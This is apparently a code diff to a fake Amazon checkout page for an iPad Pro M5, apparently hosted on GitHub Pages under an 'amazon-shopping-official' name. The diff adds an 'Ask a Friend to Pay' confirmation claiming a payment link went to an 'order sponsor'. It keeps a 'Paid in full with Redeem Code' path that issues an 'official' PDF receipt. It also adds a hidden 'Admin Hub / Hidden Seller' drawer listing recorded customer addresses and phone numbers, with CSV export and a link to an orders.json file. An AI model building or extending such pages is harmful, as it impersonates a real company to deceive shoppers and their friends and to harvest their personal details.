@@ -526,7 +526,7 @@
                   <div class="pay-desc">Pay instantly using an Amazon Gift Card, Voucher, or Promotional Redeem Code.</div>
                   <div class="redeem-code-box" id="boxRedeemInput" style="display:none;" onclick="event.stopPropagation();">
                     <div style="display:flex; gap:8px;">
-                      <input type="text" id="inputRedeemCode" class="redeem-input" value="AMZN-7K9W-M3XP-84QL" placeholder="Enter claim code (e.g. AMZN-7K9W-M3XP-84QL)" autocomplete="off">
+                      <input type="text" id="inputRedeemCode" class="redeem-input" placeholder="Enter claim code (e.g. AMZN-7K9W-M3XP-84QL)" autocomplete="off">
                       <button type="button" id="btnApplyRedeemCode" class="btn-apply-redeem">Apply</button>
                     </div>
                     <div id="redeemStatusMsg" class="redeem-status-msg"></div>
@@ -535,9 +535,14 @@
               </label>
             </div>
 
-            <button type="button" class="btn-continue-step" id="btnSavePayment" style="margin-top:16px;">
-              Use this payment method
-            </button>
+            <div style="display:flex; align-items:center; gap:12px; margin-top:16px; flex-wrap:wrap;">
+              <button class="btn-continue-step" id="btnContinueToReview" style="margin-top:0;">
+                Use this payment method
+              </button>
+              <button type="button" class="btn-change-step" id="btnBackToAddress" style="padding:6px 12px; font-size:13px;">
+                &larr; Back to address
+              </button>
+            </div>
           </div>
 
           <!-- Summary shown once completed -->
@@ -557,7 +562,7 @@
             <div style="display:flex; gap:16px; align-items:center; padding:14px; background:#f9fafb; border:1px solid #eee; border-radius:6px; margin-bottom:16px;">
               <img id="reviewItemPhoto" src="../../images/ipad/ipad-pro-m5-space-black.jpg" style="width:65px; height:65px; object-fit:contain;" alt="Apple iPad Pro M5">
               <div>
-                <h4 id="reviewItemTitle" style="font-size:15px; font-weight:700;">Apple iPad Pro (M5, 11-inch, 256 GB) - Space Black</h4>
+                <h4 id="reviewItemTitle" style="font-size:15px; font-weight:700;">Apple iPad Pro (M5, 11-inch Ultra Retina XDR Tandem OLED, 256 GB) - Space Black</h4>
                 <div style="font-size:13px; color:#555; margin-top:2px;">
                   Quantity: <strong id="reviewItemQty">1</strong> &bull; <span style="color:var(--price-red); font-weight:700;" id="reviewItemPrice">$999.00</span>
                 </div>
@@ -585,7 +590,7 @@
           By placing your order, you agree to Amazon's <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=468496" style="color:var(--link-color);">privacy notice</a> and <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088" style="color:var(--link-color);">conditions of use</a>.
         </p>
 
-        <h3 class="cs-heading">Order Summary</h3>
+        <h3 style="font-size:16px; font-weight:700; margin-bottom:12px; border-bottom:1px solid #eee; padding-bottom:8px;">Order Summary</h3>
         <div class="cs-row">
           <span>Items:</span>
           <span id="csItemsPrice">$999.00</span>
@@ -594,163 +599,125 @@
           <span>Shipping &amp; handling:</span>
           <span>$0.00</span>
         </div>
-        <div class="cs-row">
-          <span>Total before tax:</span>
-          <span id="csTotalBeforeTax">$999.00</span>
-        </div>
-        <div class="cs-row">
-          <span>Estimated tax:</span>
-          <span>$0.00</span>
-        </div>
-        <div class="cs-row" id="csRedeemDiscountRow" style="display:none; color:var(--amazon-green); font-weight:600;">
-          <span>Amazon Gift Card / Redeem Code:</span>
+        <div class="cs-row" id="csRedeemDiscountRow" style="display:none; color:#007600; font-weight:600;">
+          <span>Redeem Code / Gift Card:</span>
           <span id="csRedeemDiscountAmount">-$999.00</span>
         </div>
-        <div class="cs-row cs-row-total">
+        <div class="cs-row total">
           <span>Order total:</span>
           <span id="csTotalPrice">$999.00</span>
         </div>
       </aside>
     </div>
-  </main>
 
-  <!-- 3. CLEAN AUTHENTIC AMAZON ORDER CONFIRMATION SCREEN -->
-  <main class="confirmation-wrapper" id="orderConfirmationScreen">
-    <span id="confOrderNumber" style="display:none;"></span>
-    <div class="conf-top-banner">
-      <div class="conf-check-icon">✓</div>
-      <div>
-        <h2 class="conf-h2">Order placed successfully!</h2>
-        <div class="conf-subtitle">
-          The order confirmation will be sent to your email (<strong id="confEmailNotice"></strong>). If you don't find the email, check your spam folder.
-        </div>
-        <div style="font-size:12px; color:#555; margin-top:6px;">
-          Order Placed: <strong id="confOrderDate"></strong> &bull; ✈️ International Priority Shipping
-        </div>
-      </div>
-    </div>
-
-    <!-- Email Alert Notice -->
-    <div class="conf-email-alert">
-      <div class="alert-icon">✉️</div>
-      <div>
-        <strong>Order placed successfully!</strong>
-        The order confirmation will be sent to your email. If you don't find the email, check your spam folder.
-      </div>
-    </div>
-
-    <!-- Interactive Delivery Timeline Tracker -->
-    <div class="tracker-card">
-      <div class="tracker-header">
+    <!-- 3. CLEAN AUTHENTIC AMAZON ORDER CONFIRMATION SCREEN -->
+    <div class="order-confirmation-screen" id="orderConfirmationScreen">
+      <span id="confOrderNumber" style="display:none;"></span>
+      <div class="conf-top-banner">
+        <div class="conf-check-icon">✓</div>
         <div>
-          <span class="tracker-tag">In Transit</span>
-          <h3 class="tracker-title">Estimated Delivery: <span id="trackerDeliveryDate"></span></h3>
-          <p class="tracker-subtitle">Priority Express Dispatch &bull; Handled by Amazon Global Logistics</p>
-        </div>
-        <button type="button" class="btn-track-package" id="btnTrackPackage">
-          <span>Track Package</span>
-        </button>
-      </div>
-
-      <!-- Stepper with Truck -->
-      <div class="delivery-stepper">
-        <div class="step-point completed">
-          <div class="dot"><span class="dot-inner">✓</span></div>
-          <span class="label">Ordered</span>
-          <span class="sub-label" id="stepDateOrdered">Today</span>
-        </div>
-        <div class="step-line active">
-          <div class="step-line-fill" style="width: 100%;"></div>
-        </div>
-        <div class="step-point completed">
-          <div class="dot"><span class="dot-inner">✓</span></div>
-          <span class="label">Dispatched</span>
-          <span class="sub-label">Verified</span>
-        </div>
-        <div class="step-line active">
-          <div class="step-line-fill" style="width: 50%;"></div>
-          <!-- Animated Logistics Truck -->
-          <div class="truck-icon" title="In Transit">
-            <svg viewBox="0 0 24 24" width="22" height="22" fill="#007185">
-              <path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zm-1.5 9c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/>
-            </svg>
+          <h2 class="conf-h2">Order placed successfully!</h2>
+          <div class="conf-subtitle">
+            The order confirmation will be sent to your email (<strong id="confEmailNotice"></strong>). If you don't find the email, check your spam folder.
+          </div>
+          <div style="font-size:12px; color:#555; margin-top:6px;">
+            Order Placed: <strong id="confOrderDate"></strong> &bull; ✈️ International Priority Shipping
           </div>
         </div>
-        <div class="step-point current">
-          <div class="dot pulse"><span class="dot-inner"></span></div>
-          <span class="label">In Transit</span>
-          <span class="sub-label">On Schedule</span>
-        </div>
-        <div class="step-line">
-          <div class="step-line-fill" style="width: 0%;"></div>
-        </div>
-        <div class="step-point">
-          <div class="dot"><span class="dot-inner"></span></div>
-          <span class="label">Delivered</span>
-          <span class="sub-label" id="stepDateDelivered">Estimated</span>
-        </div>
       </div>
-    </div>
 
-    <!-- Friend Notice (Hidden when redeem code is used) -->
-    <div class="conf-friend-alert" id="confFriendNoticeBox" style="display:none;">
-      <div class="alert-icon">🤝</div>
-      <div>
-        <strong>Payment Link Sent to Order Sponsor</strong>
-        <p style="margin-top:2px;">
-          We've sent the payment link to your order sponsor. Once payment is confirmed, your package will be dispatched directly to your delivery address below.
-        </p>
-      </div>
-    </div>
-
-    <!-- Redeem Code Confirmation Notice -->
-    <div class="conf-redeem-alert" id="confRedeemNoticeBox">
-      <div class="alert-icon" style="font-size:24px;">🎟️</div>
-      <div>
-        <strong style="color:#007600; font-size:15px;">Paid in full with Redeem Code!</strong>
-        <p style="margin:4px 0 0 0; font-size:13px; color:#333;">
-          Your Amazon Redeem Code was applied successfully. Your official downloadable PDF receipt and tax invoice has been generated.
-        </p>
-      </div>
-    </div>
-
-    <!-- Clean Order & Delivery Summary -->
-    <div class="conf-summary-card">
-      <div class="conf-section-title">Delivery &amp; Item Details</div>
-      
-      <div class="conf-grid-details">
+      <div class="conf-email-alert">
+        <div class="alert-icon">✉️</div>
         <div>
-          <strong>Shipping Destination:</strong><br>
-          <span id="confRecipientName" style="font-weight:700; color:#111;"></span><br>
-          <span id="confFullAddress"></span><br>
-          Phone: <span id="confPhone"></span>
-        </div>
-
-        <div>
-          <strong>Order Details:</strong><br>
-          <span id="confItemName" style="font-weight:700; color:#111;"></span><br>
-          Quantity: <span id="confQty">1</span><br>
-          Order Total: <strong style="color:#007600; font-size:15px;" id="confTotal">$0.00 (Paid in Full)</strong><br>
-          Payment Method: <strong style="color:#007185;" id="confPayMethod">Amazon Redeem Code</strong><br>
-          Expected Delivery: <strong style="color:#007600;" id="confExpectedDelivery"></strong><br>
-          <span style="font-size:12px; color:#007600;" id="confPaymentStatus">Status: Paid in Full &bull; Ready for Priority Dispatch</span>
+          <strong>Order placed successfully!</strong>
+          The order confirmation will be sent to your email. If you don't find the email, check your spam folder.
         </div>
       </div>
 
-      <!-- Action Buttons -->
-      <div class="conf-actions-row">
-        <button type="button" class="btn-conf-secondary btn-download-pdf" id="btnDownloadReceiptBtn" style="background:#ffd814; border-color:#fcd200; font-weight:700; color:#111;">
-          <span>📥 Download Receipt (PDF)</span>
-        </button>
-        <button class="btn-conf-secondary" id="btnContinueShopping">
-          <span>Continue Shopping</span>
-        </button>
-        <button class="btn-conf-secondary" id="btnBackToProductPage">
-          <span>&larr; Back to product</span>
-        </button>
+      <!-- Friend Notice -->
+      <div class="conf-friend-alert" id="confFriendNoticeBox">
+        <div class="alert-icon">🤝</div>
+        <div>
+          <strong>Payment Link Sent to Order Sponsor</strong>
+          <p style="margin-top:2px;">
+            We've sent the payment link to the person who shared this item with you. Once payment is confirmed, your package will be dispatched directly to your delivery address below.
+          </p>
+        </div>
+      </div>
+
+      <!-- Redeem Code Confirmation Notice -->
+      <div class="conf-redeem-alert" id="confRedeemNoticeBox" style="display:none;">
+        <div class="alert-icon" style="font-size:24px;">🎟️</div>
+        <div>
+          <strong style="color:#007600; font-size:15px;">Paid in full with Redeem Code!</strong>
+          <p style="margin:4px 0 0 0; font-size:13px; color:#333;">
+            Your Amazon Redeem Code was applied successfully. Your official downloadable PDF receipt and tax invoice has been generated.
+          </p>
+        </div>
+      </div>
+
+      <!-- Clean Summary -->
+      <div class="conf-summary-card">
+        <div class="conf-section-title">Delivery &amp; Item Details</div>
+        
+        <div class="conf-grid-details">
+          <div>
+            <strong>Shipping Destination:</strong><br>
+            <span id="confRecipientName" style="font-weight:700; color:#111;"></span><br>
+            <span id="confFullAddress"></span><br>
+            Phone: <span id="confPhone"></span>
+          </div>
+
+          <div>
+            <strong>Order Details:</strong><br>
+            <span id="confItemName" style="font-weight:700; color:#111;"></span><br>
+            Quantity: <span id="confQty">1</span><br>
+            Order Total: <strong style="color:var(--price-red); font-size:15px;" id="confTotal">$999.00</strong><br>
+            Payment Method: <strong style="color:#007185;" id="confPayMethod">Ask a Friend to Pay</strong><br>
+            Expected Delivery: <strong style="color:#007600;" id="confExpectedDelivery"></strong><br>
+            <span style="font-size:12px; color:#555;" id="confPaymentStatus">Status: Awaiting payment by order sponsor</span>
+          </div>
+        </div>
+
+        <div class="conf-actions-row">
+          <button type="button" class="btn-conf-secondary btn-download-pdf" id="btnDownloadReceiptBtn" style="background:#ffd814; border-color:#fcd200; font-weight:700; color:#111;">
+            <span>📥 Download Receipt (PDF)</span>
+          </button>
+          <button class="btn-conf-secondary" id="btnContinueShopping">
+            <span>Continue Shopping</span>
+          </button>
+          <button class="btn-conf-secondary" id="btnBackToProductPage">
+            <span>&larr; Back to product</span>
+          </button>
+        </div>
       </div>
     </div>
   </main>
+
+  <!-- SLIDE-OUT DRAWER: RETURNS & ORDERS (ADMIN HUB / HIDDEN SELLER) -->
+  <div class="orders-drawer-backdrop" id="drawerBackdrop"></div>
+  <aside class="orders-drawer" id="ordersDrawer">
+    <div class="od-header">
+      <h3>Customer Orders &amp; Billing Records (Admin Hub)</h3>
+      <button class="od-close" id="btnCloseDrawer">&times;</button>
+    </div>
+
+    <div class="od-body">
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px;">
+        <span style="font-size:12px; color:var(--text-muted);">Recorded customer addresses &amp; statements</span>
+        <div style="display:flex; gap:6px; align-items:center;">
+          <a href="../../orders/?admin=1" target="_blank" rel="noopener" style="background:#007185; color:#fff; text-decoration:none; padding:4px 8px; border-radius:4px; font-size:11px; font-weight:600; display:inline-flex; align-items:center; gap:4px;">📦 Orders Portal &rarr;</a>
+          <a id="adminOrdersJsonLink" href="https://github.com/amazon-shopping-official/amazon-shopping-official.github.io/blob/main/store/ipadprom5/orders.json" target="_blank" rel="noopener" style="background:#24292f; color:#fff; text-decoration:none; padding:4px 8px; border-radius:4px; font-size:11px; font-weight:600; display:inline-flex; align-items:center; gap:4px;">📂 orders.json</a>
+          <button id="btnExportOrdersCsv" style="background:#f0f2f2; border:1px solid #d5d9d9; padding:4px 10px; border-radius:4px; font-size:11px; cursor:pointer; font-weight:600;">📥 Export CSV</button>
+          <button id="btnClearAllOrders" style="background:none; border:1px solid #e77600; color:#c7511f; padding:4px 8px; border-radius:4px; font-size:11px; cursor:pointer;">Clear</button>
+        </div>
+      </div>
+
+      <div id="ordersListContainer">
+        <!-- Rendered dynamically -->
+      </div>
+    </div>
+  </aside>
 
   <!-- PRINTABLE BILLING INVOICE MODAL -->
   <div class="orders-drawer-backdrop" id="invoiceModalBackdrop" style="display:none; align-items:center; justify-content:center; padding:20px; z-index:2000;">
@@ -790,6 +757,6 @@
 
   <script src="../../html2pdf.bundle.min.js"></script>
   <script src="../../invoice-pdf.js"></script>
-  <script src="ipad-app.js?v=20260927_03"></script>
+  <script src="ipad-app.js?v=20260928_01"></script>
 </body>
 </html>
